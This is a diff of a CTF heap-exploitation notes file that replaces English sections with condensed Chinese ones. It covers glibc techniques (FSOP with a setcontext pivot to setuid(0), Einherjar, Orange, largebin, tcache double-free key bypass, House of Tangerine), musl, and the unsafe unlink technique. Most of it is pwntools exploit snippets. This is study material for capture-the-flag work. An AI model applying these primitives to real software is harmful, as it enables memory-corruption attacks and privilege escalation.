-# 2. Free A to unsorted, then trigger sort into largebin via large allocation
-free(a)
-malloc(0x500)  # forces unsorted → largebin sorting; A now in largebin
-
-# 3. Forge fake chunk that passes safe-unlink inside A (self-pointing)
-#    Required for any later unlink/consolidation — otherwise free(B) aborts.
-fake = flat({
-    0x00: p64(0),
-    0x08: p64(0x430 | 1),
-    0x10: p64(a_addr),       # fd -> self
-    0x18: p64(a_addr),       # bk -> self
-    0x20: p64(a_addr),       # fd_nextsize -> self
-    0x28: p64(a_addr),       # bk_nextsize -> self
+fake_wide_data = flat({
+    0x18: p64(0),                # _IO_write_base
+    0x30: p64(0),                # _IO_buf_base
+    0xe0: p64(fake_wide_vtable),
 })
-edit(a, fake)  # overflow/UAF writes fake metadata into freed A
 
-# 4. Corrupt B's bk_nextsize while B is still allocated or freed but not yet sorted
-#    Goal: next largebin insertion writes heap addr to target (e.g., __free_hook, global array)
-target = free_hook - 0x20  # bk_nextsize write is at offset 0x28 → target-0x20
-edit(b, p64(0)*3 + p64(target))  # overwrite bk_nextsize field at +0x28
-
-# 5. Free B → unsorted → next malloc sorts both A and B into largebin
-#    Insertion path follows corrupted bk_nextsize → writes heap addr to target
-free(b)
-malloc(0x500)  # triggers largebin insertion → arbitrary heap write to target
-
-# 6. Follow-up: overwrite target with system / stack pivot
-#    Second variant: corrupt bk (fd/bk path) to write libc main_arena to target+8
+fake_wide_vtable = flat({0x68: p64(libc.sym.system)})   # __doallocate 槽
 ```
 
-**Key requirements:**
-- Need at least 2 large chunks in same bin index but different sizes (so `size < bck->bk_nextsize->size` branch is taken).
-- Need overflow/UAF to overwrite `fd/bk/fd_nextsize/bk_nextsize` before sorting.
-- Safe-unlink bypass: all four pointers of the fake chunk point to itself (self-referential). Real exploit does not need to pass unlink unless consolidation is triggered — pure largebin insertion only needs the `bk_nextsize` corruption, but any `free()` that consolidates must pass the full check.
-- glibc 2.32+ adds `safe-linking` for tcache but not for largebin `bk_nextsize` — the largebin nextsize pointers remain raw, making the primitive still viable in 2024 challenges.
+触发链：`exit()` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)` → `system(fp)`，而 `fp` 就是 `" sh\x00..."`。
 
-**TravelGraph / Setjmp (2024) takeaways:**
-- Both challenges isolated tcache (counts exhausted or `calloc` path) and forced unsorted/largebin path.
-- TravelGraph used a `Graph` object with `size` field adjacent to heap chunk metadata — overflow `size` to make chunk appear large, then largebin insertion overwrote a function pointer table.
-- Setjmp used `jmp_buf` as target: overwriting `__jmpbuf[6]` (saved RSP) via largebin `bk_nextsize` write gave RIP control on next `longjmp`.
+**`_IO_write_ptr > _IO_write_base` 是硬条件**，两个都是 0 就走不到 overflow 分支。
 
-**Mitigations & detection:**
-- glibc 2.38 tightened `largebin` insertion: early abort if `bk_nextsize->fd_nextsize != bck`. Bypass requires the fake `bk_nextsize` chain to be a valid circular list (self-pointing satisfies).
-- Always check tcache counts first — if tcache bin is not full (count < 7 on 2.39), `free()` goes to tcache, not unsorted/largebin. Drain tcache or use `calloc`-sized allocations to bypass (see tcache 2.39 note).
+### 2.1 SUID 下换 `setcontext`
 
----
+`system("/bin/sh")` 在 SUID 里拿不到 root——dash 检测到 `uid != euid` 会主动降权。改成 `setcontext(fp)`，先跑 ROP 调 `setuid(0)`：
 
-## tcache 2.39 Changes — Key, Count, and calloc
+```python
+fake_wide_vtable = flat({0x68: p64(libc.sym.setcontext + 61)})
 
-**glibc 2.39 tcache layout (x86-64):**
+# glibc >= 2.29：ucontext 指针在 RDI（经 _IO_wdoallocbuf 到达时是 fp->_wide_data）
+#   RSP ← [rdi+0xa0]，RIP ← [rdi+0xa8]，RDI ← [rdi+0x68]
+# glibc <= 2.28：寄存器相对 RDX 取（[rdx+0xa0] / [rdx+0xa8] / [rdx+0x68]）
+fake_wide_data = flat({
+    0x18: p64(0),
+    0x30: p64(0),
+    0x68: p64(0),                  # RDI = 0 → setuid(0)
+    0xa0: p64(rop_chain_addr),     # RSP
+    0xa8: p64(libc.sym.setuid),    # RIP
+    0xe0: p64(fake_wide_vtable),
+})
+```
+
+**`setcontext` 是通用栈枢轴 gadget**——它从可控内存里读 RSP/RDI/RIP，等于「FILE 利用之后接任意 ROP」。
+
+## 3. House of Einherjar
+
+off-by-one 的 NUL 落在 `malloc_usable_size` 边界上，清掉下一个块的 `PREV_INUSE`。
+
+四步：伪造 `prev_size` 制造「前块已释放」→ 造一个**四个指针全指向自己**的假块（过 `unlink_chunk`）→ 合并后得到重叠块 → tcache poisoning 或 FSOP。
+
+```python
+fake_chunk = flat({
+    0x00: p64(0),
+    0x08: p64(target_size | 1),  # PREV_INUSE 置位
+    0x10: p64(fake_addr),        # fd → self
+    0x18: p64(fake_addr),        # bk → self
+    0x20: p64(fake_addr),        # fd_nextsize → self
+    0x28: p64(fake_addr),        # bk_nextsize → self
+}, filler=b'\x00')
+```
+
+`unlink_chunk` 检查 `FD->bk == P && BK->fd == P`，大块还要 `fd_nextsize->bk_nextsize == P && bk_nextsize->fd_nextsize == P`。**自指是唯一能同时满足四个条件的构造。**
+
+## 4. House of Orange
+
+二进制**没有 free 功能**时用。改小 top chunk 的 size，让下一次大分配失败，逼 `sysmalloc` 把老 top 释放进 unsorted。
+
+```python
+edit(0, b'A' * overflow_len + p64(0xc01))   # 伪造小 top
+add(0x1000, b'B')                            # 触发 sysmalloc
+```
+
+伪造 size 的三个硬条件：`(size & 0xFFF) == 0`（页对齐的结尾）、`size >= MINSIZE`、`PREV_INUSE` 置位。
+
+## 5. House of Spirit
+
+在可控内存（栈/`.bss`/堆）伪造块，让 `free()` 把它收进 bin，下次同尺寸分配就返回那块。
+
+```python
+fake_chunk = flat(
+    0,                # prev_size
+    0x41,             # size = 0x40 | PREV_INUSE
+    0, 0, 0, 0, 0, 0, # 数据区
+    0,                # 下一个块的 prev_size
+    0x41,             # 下一个块的 size —— free() 会校验这个
+)
+```
+
+**`free()` 同时校验当前块和「下一个块」的 size**，只造一个过不了。下一个块在 `chunk + size` 处，必须也落在可读内存里且 size 合法。
+
+## 6. House of Lore
+
+改 smallbin 块的 `bk` 指向假块，让第二次分配返回假块。
+
+```python
+free(chunk_a); malloc(large_size)     # 排序，chunk_a 进 smallbin
+fake = flat(0, 0x91, addr_of_real_chunk, addr_of_fake2)
+edit_freed_chunk(chunk_a, bk=addr_of_fake)
+malloc(0x80)   # 返回 chunk_a
+malloc(0x80)   # 返回假块
+```
+
+要求假块的 `fd` 指回一个 `bk` 指向假的块（`victim->bk->fd == victim`）。老 glibc 上这个检查更弱。
+
+## 7. House of Force（glibc < 2.29）
+
+改 top 的 size 为 `-1`，再用一次超大分配把 top 推到目标地址。
+
+```python
+add_card(-1, b'A' * 24 + p64(0xffffffffffffffff))
+evil_size = target - 16 - top_chunk_ptr     # 目标 - 元数据 - 当前 top
+add_card(evil_size - 25, b'')
+add_card(100, p64(libc.symbols['system']))  # 落在目标上
+```
+
+**2.29 加了 top size 校验就废了**，先确认版本。
+
+## 8. tcache stashing unlink
+
+tcache 未满时从 smallbin 取块，剩下的会被「塞进」tcache——**塞的过程中跟 `bk` 链而不做完整校验**。
+
+```python
+# 前提：tcache 满 7 个可排空 + smallbin 里 2 个，第 2 个的 bk 被改
+edit_after_free(smallbin_chunk_2, bk=target_addr - 0x10)
+malloc(target_size)   # 塞 chunk_2 进 tcache，再跟 bk → target 也进 tcache
+malloc(target_size)   # 返回 chunk_2
+malloc(target_size)   # 返回 target
+```
+
+`target - 0x10` 是因为 tcache 存的是「用户数据指针」，在块头之后 0x10。
+
+塞入时 glibc 会执行 `bck->fd = bin`（`bck = victim->bk`），等于把 main_arena 地址写到 `target`——**写的是 libc 地址不是可控值**，够改 FILE 结构或堆元数据。
+
+## 9. largebin attack
+
+只能改 largebin 块的 `bk_nextsize` 时用。**2.32+ 的 safe-linking 只管 tcache，largebin 的 nextsize 指针仍是裸的**，所以这招在 2024 年的题里依然有效。
+
+```python
+a = malloc(0x428); b = malloc(0x428); guard = malloc(0x28)
+free(a); malloc(0x500)                  # 排序，a 进 largebin
+
+fake = flat({0x00: p64(0), 0x08: p64(0x430 | 1),
+             0x10: p64(a_addr), 0x18: p64(a_addr),
+             0x20: p64(a_addr), 0x28: p64(a_addr)})
+edit(a, fake)                           # 自指假块，过 safe-unlink
+
+target = free_hook - 0x20               # bk_nextsize 在 +0x28
+edit(b, p64(0)*3 + p64(target))
+free(b); malloc(0x500)                  # 插入时跟 bk_nextsize → 写 heap 地址到 target
+```
+
+两个前提：同 bin 索引里至少两个**尺寸不同**的大块（才会走 `size < bck->bk_nextsize->size` 分支）；排序前能改到那四个指针。
+
+**2.38 收紧了插入**：`bk_nextsize->fd_nextsize != bck` 会提前 abort，但自指构造依然满足。
+
+`bk_nextsize` 写的是 **heap 地址**，`bk` 路径写的是 **main_arena 地址**。要写可控值得再借一步（比如写进 `_IO_list_all` 之后伪造 FILE）。
+
+## 10. glibc 2.39 的三处变化
 
 ```c
 typedef struct tcache_entry {
-    struct tcache_entry *next;  // +0x00: safe-linked (mangled)
-    uintptr_t            key;   // +0x08: random tcache key (double-free detection)
+    struct tcache_entry *next;   // +0x00 safe-linked
+    uintptr_t            key;    // +0x08 随机 key（double free 检测）
 } tcache_entry;
 
 typedef struct tcache_perthread_struct {
-    char    counts[TCACHE_MAX_BINS]; // +0x00: per-bin count (TCACHE_MAX_BINS=64)
-    tcache_entry *entries[TCACHE_MAX_BINS]; // +0x40: heads (mangled next)
+    char          counts[64];        // +0x00 现在是 char，不是 uint16
+    tcache_entry *entries[64];       // +0x40
 } tcache_perthread_struct;
-// On 2.39, TCACHE_MAX_BINS=64, max count per bin = 7 (was 7 since 2.29, remains 7)
 ```
 
-**What changed in 2.39:**
-- `key` moved to `+0x08` (was `+0x00` next field's key overlay in older? Actually since 2.32 `key` is at +0x08, but 2.39 hardens checks). Double-free detection compares `e->key == tcache_key` where `tcache_key` is a per-thread random value stored in `tcache_perthread_struct`.
-- `counts[]` is now a `char` array at offset 0x00 (previously `uint16_t`); max count enforced as 7 — freeing 8th chunk of same size goes to fastbin/unsorted, not tcache. **Count = 7 is the hard limit on glibc 2.39 Ubuntu 24.04.**
-- **`calloc` now uses tcache (since 2.39 / commit 5b82f6c):** previously `calloc` bypassed tcache and used `malloc`+`memset`. Now `calloc(n, size)` checks tcache first. This matters because `calloc` zero-fills, and it *does* trigger double-free key checks. Old `calloc` UAF tricks that assumed tcache bypass no longer work.
+三点必须记住：
+
+1. **`key` 在 `+0x08`**。double free 检测是 `e->key == tcache_key`。
+2. **count 上限 7**。第 8 次 free 同尺寸会落到 fastbin/unsorted，这正好是逼出 largebin 路径的手段。
+3. **`calloc` 现在也走 tcache**（2.39 之前绕过）。老题里「用 `calloc` 避开 tcache」的套路失效；反过来，`calloc` 的隐式 `memset(0)` 会清掉 `next`/`key`。
+
+绕过 double free 检测：
 
 ```python
-# tcache 2.39: key at +0x08, count 7, calloc uses tcache
-
-# Double-free detection (tcache_put):
-#   e->key = tcache_key;
-#   if (counts[bin] >= 7) goto fastbin;
-#   if (e->key == tcache_key) abort("double free or corruption (out)");
-
-# tcache_get (malloc):
-#   e = entries[bin];
-#   entries[bin] = REVEAL_PTR(e->next);
-#   --counts[bin];
-
-# Safe-linked next: next = PROTECT_PTR(chunk_addr, target)
-#   PROTECT_PTR(pos, ptr) = ptr ^ (pos >> 12)
+free(p)                        # key = tcache_key
+q = malloc(0x40)               # 同块重新分配，key 字段变成可写数据区
+edit(q, p64(0) + p64(0))       # 把 +0x08 清零
+free(q)                        # e->key != tcache_key → 通过
 ```
 
-**Double-free key detection bypass pattern:**
+## 11. House of Tangerine（2.39）
+
+count 只有 7 且 `calloc` 也吃 count 时，把 tcache 和 unsorted 桥起来：
 
 ```python
-from pwn import *
-
-# Scenario: UAF gives double-free on same chunk without intermediate malloc.
-# On 2.39, second free aborts if e->key already == tcache_key.
-
-# 1. Allocate and free once (key written, count=1)
-p = malloc(0x40)
-free(p)  # chunk->key = tcache_key
-
-# 2. Reallocate (malloc pops from tcache, key field becomes user data)
-q = malloc(0x40)  # same chunk, now allocated; key field is writable payload area
-# Overwrite key field at +0x08 to break detection
-payload = p64(0) + p64(0)  # +0x00 next, +0x08 key = 0 (not equal to tcache_key)
-edit(q, payload)
-
-# 3. Free again — now e->key != tcache_key, so second free succeeds (no abort)
-free(q)  # bypassed!
-
-# 4. Alternative: use calloc to bypass stale key
-#    Since calloc now uses tcache, it also pops and checks key, but zero-fills.
-#    If you cannot edit key, allocate with different size then re-free:
-free(p)  # after bypass, chunk is in tcache again with fresh key
-r = calloc(1, 0x40)  # 2.39: calloc pulls from same tcache bin → key overwritten with 0s via memset
-free(r)
-free(r)  # double-free via calloc zeroing — key is now 0
-
-# 5. Classic tcache poisoning after bypass:
-#    Free -> edit fd (mangled) -> malloc -> malloc returns target
-free(p)
-edit(p, p64((target ^ (p_addr >> 12))))  # mangle fd at +0x00
-malloc(0x40)  # pop p
-malloc(0x40)  # returns target → arbitrary write
-```
-
-**Key takeaways for CTF (2024+):**
-- Always consider `key at +0x08` when crafting fake tcache chunks — zero it or set to non-key value before second free.
-- Count 7: after 7 frees of same size, the 8th free leaks to unsorted/fastbin — useful to force largebin path (see Largebin Attack).
-- `calloc` no longer escapes tcache: if the challenge uses `calloc` for allocations, tcache poisoning still works, but you must account for the implicit `memset(0)` clobbering the next/key fields.
-
----
-
-## House of Tangerine — tcache Count + Unsorted Bin Variant
-
-**When to use:** glibc 2.39 (Ubuntu 24.04) where tcache count is 7 and `calloc` uses tcache. House of Tangerine bridges tcache and unsorted bin to get arbitrary write without a direct overflow into `fd`.
-
-**Vulnerability requirements:** UAF or off-by-one that can corrupt the `counts[]` byte or leak heap, plus ability to allocate large chunks.
-
-**Core idea:**
-1. Fill tcache bin (count 7) for size `0x40` so next `free(0x40)` goes to unsorted bin instead of tcache.
-2. Use UAF to corrupt the tcache count byte for another size (or the same size) to `0xff`, allowing an extra `malloc` to underflow the count and later write out-of-bounds via tcache stash.
-3. Free a large chunk (>0x400) that lands in unsorted bin, then allocate to trigger largebin sorting that writes `main_arena` to a tcache `next` pointer.
-
-**Minimal exploit sketch:**
-
-```python
-# 1. Fill tcache 0x40 count to 7
+# 1. 塞满 0x40 的 tcache，第 8 次 free 落进 unsorted
 chunks = [malloc(0x40) for _ in range(8)]
-for c in chunks[:7]:
-    free(c)                      # tcache count = 7 (full)
-free(chunks[7])                  # 8th free → unsorted bin (not tcache)
-# chunks[7] now in unsorted with fd/bk = main_arena+...
+for c in chunks[:7]: free(c)
+free(chunks[7])                     # → unsorted，fd/bk = main_arena+...
 
-# 2. Corrupt tcache count for 0x40 to 0xff via UAF on tcache_perthread_struct
-#    tcache_perthread_struct is allocated at heap base via first malloc
-#    Overflow from adjacent chunk into counts[bin_index] byte
-edit(overflow_chunk, p16(0xffff))  # set count byte to large value
+# 2. UAF 改 tcache_perthread_struct 的 counts 字节到 0xff
+edit(overflow_chunk, p16(0xffff))
 
-# 3. Drain tcache to trigger stashing unlink (see tcache Stashing Unlink Attack)
-#    Now malloc from largebin will stash remaining chunks into tcache,
-#    and corrupted count allows writing main_arena pointer to arbitrary target
-for _ in range(7):
-    malloc(0x40)
-
-# 4. Corrupt unsorted chunk's bk to target-0x10
+# 3. 排空 tcache 触发 stashing，corrupted count 让 main_arena 写到任意目标
+for _ in range(7): malloc(0x40)
 edit(unsorted_chunk, bk=target-0x10)
-malloc(0x40)  # stashes bk → target gets linked into tcache → next malloc returns target
-malloc(0x40)
-pwn = malloc(0x40)  # == target → arbitrary write (e.g., __free_hook / _IO_list_all)
+malloc(0x40); malloc(0x40); malloc(0x40)   # 第三个返回 target
 ```
 
-**Why 2.39 matters:** Before 2.39, `calloc` bypassed tcache, so House of Tangerine's `count` corruption could be stabilized with `calloc` allocations that didn't affect counts. On 2.39, `calloc` decrements the same `counts[]` byte, so the attacker must account for it or use `count 7` saturation to force unsorted bin path explicitly.
+2.39 之前 `calloc` 不碰 count，可以用它稳定状态；2.39 之后必须显式按 count 7 饱和来逼 unsorted 路径。
 
-**References:** House of Tangerine — 2024 CTF, glibc 2.39 adaptation of House of Muney / tcache stash.
+## 12. musl libc
 
-For CTF-specific UAF, tcache, and custom-allocator writeup variants, continue in [heap-techniques.md](#part-2).
-
----
-
-# Part 2
-
-Continuation of [[binary/漏洞利用/heap-techniques.md|heap-techniques.md]]. Part 2 collects CTF-specific UAF, tcache, and custom-allocator variants drawn from individual writeups.
-
-## Table of Contents
-- [UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)](#uaf-vtable-pointer-encoding-shell-argument-bctf-2017)
-- [Uninitialized Chunk Residue Pointer Leak (picoCTF 2018)](#uninitialized-chunk-residue-pointer-leak-picoctf-2018)
-- [tcache strcpy Null-Byte Overflow + Backward Consolidation (HITCON 2018)](#tcache-strcpy-null-byte-overflow--backward-consolidation-hitcon-2018)
-- [Adjacent-Struct fn-Pointer Overflow for Libc Leak + GOT Overwrite (RITSEC 2018)](#adjacent-struct-fn-pointer-overflow-for-libc-leak--got-overwrite-ritsec-2018)
-- [Hidden Menu Option 1337 for Tcache Poisoning (FireShell 2019)](#hidden-menu-option-1337-for-tcache-poisoning-fireshell-2019)
-- [Tcache Double-Free + Fake _IO_FILE Vtable Stdout Hijack (BCTF 2018)](#tcache-double-free--fake-_io_file-vtable-stdout-hijack-bctf-2018)
-- [Tcache-to-Fastbin Promotion Cross-Bin Attack (BCTF 2018)](#tcache-to-fastbin-promotion-cross-bin-attack-bctf-2018)
-- [6-Bit Index OOB + written_bytes Accumulator for Fn-Pointer Increment (Codegate 2019)](#6-bit-index-oob--written_bytes-accumulator-for-fn-pointer-increment-codegate-2019)
-- [IS_MMAPED Bit-Flip for Unsorted Bin Leak on Calloc'd Chunk (0CTF 2017)](#is_mmaped-bit-flip-for-unsorted-bin-leak-on-callocd-chunk-0ctf-2017)
-- [Filename-Regex-Constrained Fastbin via LSB-Only Heap Pointer Overwrite (BSidesSF 2019)](#filename-regex-constrained-fastbin-via-lsb-only-heap-pointer-overwrite-bsidessf-2019)
-- [Custom Allocator Unsafe Unlink to GOT (DEF CON Qualifier 2014)](#custom-allocator-unsafe-unlink-to-got-def-con-qualifier-2014)
-
-For FILE-structure (_IO_FILE) exploitation see [[binary/漏洞利用/heap-fsop.md|heap-fsop.md]]. For the foundational houses (Apple 2, Einherjar, Orange, Spirit, Lore, Force), unsafe unlink, tcache stashing, and musl, see [[binary/漏洞利用/heap-techniques.md|heap-techniques.md]].
-
----
-
-## UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)
-
-**Pattern:** After UAF, heap spray fills memory with `system()` addresses at a 3-byte offset. The vtable pointer address `0x??006873` encodes ASCII `"sh\x00"` at the object start, so calling `system()` through the vtable executes `system("sh")`.
+musl 没有 chunk 头，用 `meta` 结构管 group。
 
 ```python
-from pwn import *
-
-# Heap spray: fill 16MB with system() address at offset +3
-# Each spray chunk: 3 bytes padding + 8 bytes system_addr, repeated
-spray_unit = b"\x00" * 3 + p64(system_addr)
-spray_data = spray_unit * (0x1000000 // len(spray_unit))
-
-# Trigger heap spray via application interface
-for i in range(spray_count):
-    alloc(spray_data[:chunk_size])
-
-# UAF object at address 0xXX006873
-# Bytes at object start: 73 68 00 XX = "sh\x00..."
-# When vtable call dispatches: system(this) → system("sh")
-
-# Trigger: free the target object, then invoke its virtual method
-free(target_obj)
-trigger_vtable_call(target_obj)  # calls system("sh")
+meta_ptr = leak_at_offset(0x80)     # OOB 读到 meta 指针
+pie_base = meta_ptr - 0x3f20        # 首个 0x70 分配的 meta->mem 相对 PIE 固定偏移
+write_at(meta_ptr + META_MEM_OFFSET, target_addr)   # 重定向分配
+alloc_and_write(atexit_list_addr, system_addr, "cat flag")
 ```
 
-**Key insight:** The vtable pointer value itself serves as the string argument to `system()`. By arranging the heap spray so objects land at addresses containing `0x6873` (ASCII "sh") in the low bytes, the object's address doubles as a valid shell command string. This eliminates the need for a separate controlled string — the pointer IS the argument.
+**musl 没有 safe-linking 也没有 tcache**，改 `meta->mem` 就是直接控制分配落点。`atexit` 处理器列表比 glibc 的 hook 好打得多。
 
-**When to recognize:** UAF on a C++ object with virtual methods, where you control heap layout but not the exact content at the object's `this` pointer. If `system()` is called with `this` as the first argument (common in vtable dispatch), the object's address just needs to decode as a valid command string.
+判据：`ldd` 或 `strings binary | grep musl`。
 
-**References:** BCTF 2017
+## 13. 自定义分配器
 
-See [[binary/漏洞利用/heap-fsop.md|heap-fsop.md]] for FILE-structure (_IO_FILE) exploitation: fastbin stdout vtable hijack, _IO_buf_base null-byte overwrite, glibc 2.24+ vtable validation bypass, unsorted-bin attacks on stdin FILE fields, and related UAF/refcount bugs.
+**通用四步**：逆元数据布局 → 找结构里的析构/回调指针 → 溢出改指针和第一个参数 → 触发释放。
 
----
+- **nginx pool**：`ngx_destroy_pool()` 遍历 cleanup handler，改 handler 指针 + 参数就能 `system(可控串)`
+- **talloc**（Samba/CUPS）：伪造 pool 头的 `end` 让它跨过目标地址，下次 `talloc()` 直接返回任意地址；层级父子结构意味着改一个头会级联整棵分配树
 
-## Uninitialized Chunk Residue Pointer Leak (picoCTF 2018)
-
-**Pattern:** A contact manager allocates a struct `{name, bio}` on the heap but only writes `name`, leaving `bio` uninitialized. After a delete-then-create cycle the new allocation reuses a chunk that still holds a stale pointer from a previous contact. The application's `print_contact()` dereferences `bio`, turning the leftover allocator residue into a controlled heap/libc read.
+## 14. 经典 unsafe unlink（glibc < 2.26）
 
 ```c
-struct contact { char *name; char *bio; };    // bio never zeroed
-
-void create() {
-    struct contact *c = malloc(sizeof *c);
-    c->name = malloc(NAME_SZ);
-    read_line(c->name, NAME_SZ);
-    // bio left uninitialized!
-}
-
-void print(struct contact *c) { puts(c->bio); }   // leaks stale pointer target
+// free() 与相邻空闲块合并时：
+FD = P->fd; BK = P->bk;
+FD->bk = BK;   // 把 BK 写到 FD + 偏移
+BK->fd = FD;   // 把 FD 写到 BK + 偏移
 ```
 
 ```python
-from pwn import *
-io = process("./contacts")
+fake_fd = target_addr - 0x18    # 目标 - 3*sizeof(ptr)
+fake_bk = target_addr - 0x10    # 目标 - 2*sizeof(ptr)
 
-# 1. Prime the heap: create a contact whose name chunk will later be reused
-#    as the struct for the next contact.
-io.sendline("create");  io.sendline("A" * 0x18)
-io.sendline("delete 0")
-
-# 2. Create a new contact — it grabs the previously freed chunk. The old
-#    name bytes now live in the struct's `bio` field.
-io.sendline("create");  io.sendline("B" * 0x10)
-
-# 3. Print → leaks the residue as if it were a bio string.
-io.sendline("print 0")
-leak = u64(io.recvline().ljust(8, b"\x00"))
-log.success(f"heap leak: {leak:#x}")
+payload  = p64(0) + p64(data_size) + p64(fake_fd) + p64(fake_bk)
+payload += b'A' * (data_size - 32)
+payload += p64(data_size)       # 盖掉下一块的 prev_size
+payload += p64(b_size & ~1)     # 清 PREV_INUSE
 ```
 
-**Key insight:** Uninitialized fields are write-what-where primitives in reverse — the attacker does not choose *what* the field holds but can *place* chunks so that useful bytes end up in it. Target any struct field that is (a) read later without being written and (b) subject to chunk reuse. Common culprits: manually-written `malloc` + `read_line` pairs, C++ classes with members that skip initialisation in non-default constructors, and zero-allocated-then-partially-written caches.
+**2.26+ 加了 `FD->bk == P && BK->fd == P` 检查**，现代堆要换 tcache poisoning / Apple 2 / Einherjar。
 
-**References:** picoCTF 2018 — Contacts, writeup 11585
+### 14.1 扩展成任意读写
 
----
+单次 unlink 只给一次写。想升级：在 `.bss` 再造一个假块，size 从该地址一直跨到 heap top（`size = (heap_top - bss_fake) | PREV_INUSE`），`free` 它就会和 top 合并——**top 搬到 `.bss`**，之后每次 `malloc` 都返回 BSS 上的内存。
 
-## tcache strcpy Null-Byte Overflow + Backward Consolidation (HITCON 2018)
+```python
+fake_size = heap_base + 0x310 - bss_addr + 0x1
+edit_memo(3, b'A' * (256-32) + p64(prev_size) + p64(fake_size) + b'A' * 15)
+delete_memo(1)                    # top 搬到 BSS
+add_memo(size, p64(environ_addr)) # 把 &environ 写进 note 槽
+# read_memo 就能泄栈地址
+```
 
-**Pattern:** `strcpy(dst, user_name)` appends a trailing NUL that falls one byte past the allocated chunk, clearing `PREV_INUSE` on the next chunk's size field. With a forged `prev_size`, `free()` triggers backward consolidation across a tcache-resident chunk, producing two overlapping heap regions. Splitting out a remainder chunk keeps main_arena pointers in the `fd`/`bk` of one of the overlapping allocations, giving an unsorted-bin-style libc leak in the tcache era.
+## 15. 预算极紧时跨 bin
+
+只有 2 次分配时，用 tcache↔fastbin 的迁移当额外一步：
+
+```python
+for _ in range(7): free(tcache_chunks[_])   # 塞满 tcache
+free(fastbin_chunk)                          # 落到 fastbin
+edit(fastbin_chunk, p64(target_hdr))         # 毒化 fastbin fd
+for _ in range(7): malloc(size)              # 排空 tcache
+free(fastbin_chunk)                          # 提升进 tcache
+malloc(size)                                 # 返回 target_hdr
+```
+
+## 16. 未文档化的菜单选项
+
+可见菜单限制分配次数，但反汇编里有个没在菜单上列的分支（常见 `1337`、`9999`、`0xdead`），它调 `malloc`/`edit` 却不更新计数器——等于无限次分配。
+
+**先 dump 菜单解析器再下「这题限流」的结论。**
+
+## 17. 字符集过滤下只改 LSB
+
+溢出逐字节可控，但内容必须过正则时——**堆地址的高位在同 256 字节窗内是共享的**，改一个字节就能把指针搬到你已控制的数据区。
+
+```python
+pc.sendline('RENAME EEE.EXE ' + 'E'*7*8 + 'EEEEE.EXP')   # 只有 prev_file 的 LSB 变
+pc.sendline('DELE ...')                                   # 伪造项 → double free
+```
+
+正则只看「第一个以 null 结尾的字符串」，null 之后的字节不受约束——这也是可利用面。
+
+## 18. 翻 `IS_MMAPPED` 让 `calloc` 不零化
+
+`calloc` 会 `memset(0)`，挡住 unsorted 的 fd/bk 泄漏。但 `IS_MMAPPED` 置位时 glibc 跳过零化。
+
+```python
+edit(A, b'A'*0x80 + p64(0) + p64(0x91 | 0x2))   # size |= IS_MMAPPED
+malloc(0x80)                                     # 返回 B，fd/bk 还是 main_arena+0x58
+```
+
+**两个 bit 的元数据改写，就破了「calloc 挡泄漏」的假设。**
+
+## 19. 用计数器当算术垫片
+
+OOB 写只能按 QWORD 对齐，而目标函数指针离某个已有指针只差 `0x1c0`（不是 8 的倍数）时：
+
+找同结构体里按固定步长自增的计数器（如 `written_bytes += 8`），把它当可编程的偏移累加器：
+
+```python
+payload += save_cached_qword_to_comp(0x34)       # 函数指针 → buf
+payload += cache_qword(0x33, 1)                  # buf → written_bytes
+payload += save_cached_qword_to_comp(0) * 0x38   # written_bytes += 0x38*8 = 0x1c0
+payload += save_cached_qword_to_comp(0x33)       # written_bytes → buf
+payload += cache_qword(0x34, 1)                  # buf → 目标函数指针
+```
+
+**对齐写 + 计数器 = 字节级指针加法**，而且全程不需要泄代码地址。
+
+## 20. 未初始化字段泄漏
 
 ```c
-// Allocation pattern (glibc 2.27 tcache)
-char *a = malloc(0xF8);            // victim 1
-char *b = malloc(0x18);            // small header chunk with PREV_INUSE
-strcpy(a, payload);                // 0xF8 bytes + '\0' overflows into b->size
+struct contact { char *name; char *bio; };   // bio 从不初始化
+void create() { c = malloc(sizeof *c); c->name = malloc(NAME_SZ); read_line(...); }
+void print(struct contact *c) { puts(c->bio); }   // 泄残渣
 ```
 
+先 create+delete 一次让某个 name 块的字节留在堆上，再 create 让结构体复用那个块，`bio` 就指向了残留内容。
+
+**未初始化字段是「反向的 write-what-where」**：你不能决定它是什么，但能安排哪个块的残渣落进去。常见来源：手写 `malloc`+`read_line`、C++ 非默认构造函数漏初始化、部分写入的缓存。
+
+## 21. 让指针值本身当命令串
+
+C++ 对象 UAF，vtable 分发时 `this` 被当第一参数传给函数。堆喷让对象落在低字节是 `0x6873`（`"sh"`）的地址上：
+
 ```python
-from pwn import *
-
-io = process("./children_tcache")
-libc = ELF("./libc-2.27.so")
-
-# 1. Zero the 0xda memset residue with repeated smaller allocations.
-for size in (0x70, 0x60, 0x50, 0x40):
-    io.sendline("add"); io.sendline(str(size)); io.sendline(b"\x00" * size)
-
-# 2. Set up two adjacent chunks:
-io.sendline("add"); io.sendline("0xF8"); io.sendline(b"A" * 0xF8)     # victim 1
-io.sendline("add"); io.sendline("0x18"); io.sendline(b"B" * 0x18)     # header
-
-# 3. Free victim 1 into the smallbin (needs a > 0x408 sibling to bypass tcache).
-io.sendline("add"); io.sendline("0x420"); io.sendline(b"X" * 0x420)
-io.sendline("del 0")                         # smallbin → keeps libc fd/bk
-
-# 4. Overflow via strcpy: clears PREV_INUSE, forges prev_size → backward consolidate
-overflow = b"A" * 0xF0 + p64(0x100)           # fake prev_size
-io.sendline("edit 1"); io.sendline(overflow)
-io.sendline("del 1")                         # consolidate: now we overlap
-
-# 5. Re-allocate the coalesced region and read the libc pointer that still
-#    lives in the old fd/bk location.
-io.sendline("add"); io.sendline("0x110"); io.sendline(b"P" * 0x10)
-io.sendline("show 0")
-leak = u64(io.recvline().strip().ljust(8, b"\x00"))
-libc.address = leak - (libc.symbols["main_arena"] + 0x60)
-log.success(f"libc base {libc.address:#x}")
+spray_unit = b"\x00" * 3 + p64(system_addr)      # 每 11 字节放一个 system
+# 对象地址 0xXX006873 → 起始字节 73 68 00 XX = "sh\0..."
+free(target_obj); trigger_vtable_call(target_obj)  # system("sh")
 ```
 
